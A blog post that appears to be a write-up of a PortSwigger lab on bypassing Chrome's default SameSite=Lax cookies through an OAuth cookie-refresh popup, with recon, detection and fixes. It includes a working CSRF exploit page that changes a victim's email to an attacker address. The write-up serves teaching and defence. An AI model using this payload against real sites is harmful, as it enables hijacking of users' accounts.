---
layout: post
title: "PortSwigger: SameSite Lax Bypass via Cookie Refresh"
date: 2027-07-02 09:00:00 -0500
categories: [Web Security, CSRF]
tags: [portswigger, csrf, samesite, cookie, oauth, web]
---

## Lab Summary

**Lab:** SameSite Lax bypass via cookie refresh  
**Difficulty:** Practitioner  
**CWE:** CWE-352 – Cross-Site Request Forgery  
**Result:** Solved

---

## The Vulnerability

Chrome applies `SameSite=Lax` by default when a server sets a cookie **without** an explicit `SameSite` attribute. Lax normally blocks cross-site `POST` requests — which is a good default for CSRF protection.

But there's a catch: **Chrome has a 120-second exception.** If a Lax-by-default cookie was just issued via a top-level navigation (like an OAuth callback redirect), Chrome will also send it with cross-site top-level `POST` requests for the first **2 minutes** after issuance. This exists to avoid breaking SSO flows where a freshly-logged-in user immediately needs to submit forms.

The upshot: if an attacker can force the victim's browser to refresh the session cookie (re-issue it via the OAuth flow), a standard CSRF `POST` attack works within the 2-minute window — even against an app that only uses the browser's default Lax policy.

---

## Recon

The app uses OAuth-only login (`/social-login` → oauth-server → `/oauth-callback`). There's no traditional `/login` endpoint. After visiting `/social-login`, the OAuth flow runs and the callback sets a fresh session cookie:

```
Set-Cookie: session=<token>; Expires=...; Secure; HttpOnly
```

**No `SameSite` attribute.** That's the prerequisite — the 2-minute exception only applies to cookies set *without* explicit SameSite.

The `POST /my-account/change-email` form has only an `email` field — **no CSRF token** and no Origin check (a cross-origin POST returns 302, not 400).

---

## Exploit

The attack requires three things to happen in sequence:
1. Force the victim's browser to refresh the session cookie (via `/social-login`)
2. Keep the main window ready to fire the CSRF `POST`
3. Submit the CSRF form within the 2-minute window

Opening a popup achieves steps 1 and 2 simultaneously. `window.onclick` ensures the popup is triggered by user interaction (required to bypass popup blockers), and `setTimeout` fires the form after the OAuth flow completes:

```html
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
  window.onclick = () => {
    window.open("https://TARGET/social-login");
    setTimeout(() => document.forms[0].submit(), 5000);
  };
</script>
```

**Flow:**
1. Victim visits the exploit page and clicks anywhere → `window.onclick` fires
2. Popup opens `GET /social-login` → OAuth auto-approves (victim already has an OAuth session) → `/oauth-callback` issues a fresh Lax-by-default session cookie
3. 5 seconds later, `document.forms[0].submit()` fires a cross-site `POST` to `/my-account/change-email`
4. Chrome sends the freshly-issued cookie (within the 120-second exception window)
5. The email is changed — lab solved

---

## Detection Signal

```bash
# Should show no SameSite= in the Set-Cookie header:
curl -ski https://TARGET/social-login | grep -i 'set-cookie'
```

`Set-Cookie: session=...; Secure; HttpOnly` with **no** `SameSite=` attribute = vulnerable to the cookie refresh bypass.

---

## Why the Fix Is Specific

Setting `SameSite=Lax` explicitly on the cookie **removes the 2-minute exception entirely** — that exception applies only to cookies set *without* an explicit `SameSite` attribute:

```http
Set-Cookie: session=<token>; Secure; HttpOnly; SameSite=Lax
```

A CSRF token on the state-changing endpoint is the second required layer:

```html
<input type="hidden" name="csrf" value="{{session_bound_token}}">
```

Never rely on SameSite alone — the cookie refresh technique shows that even correct Lax behaviour can be gamed when there's a refresh gadget available.

---

## Key Takeaways

- Chrome's default-Lax behaviour is **not** the same as explicitly setting `SameSite=Lax` — the 2-minute POST exception only applies to the implicit default
- Any OAuth/SSO callback endpoint is a potential cookie-refresh gadget
- State-changing forms without CSRF tokens are exploitable within the refresh window even if the app appears "protected" by Lax defaults
- The fix is simple: explicitly set `SameSite=Lax` (or `Strict`) on every session cookie
